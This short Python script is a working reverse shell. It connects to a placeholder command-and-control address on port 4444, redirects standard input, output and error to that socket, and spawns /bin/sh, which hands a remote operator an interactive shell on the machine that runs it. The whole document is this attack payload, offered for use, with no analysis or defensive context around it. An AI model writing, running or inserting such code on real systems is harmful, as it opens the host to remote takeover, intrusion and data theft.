import socket,os,pty,random,base64
target_ip = "YOUR_C2_IP_HERE"
s=socket.socket()
s.connect((target_ip,4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")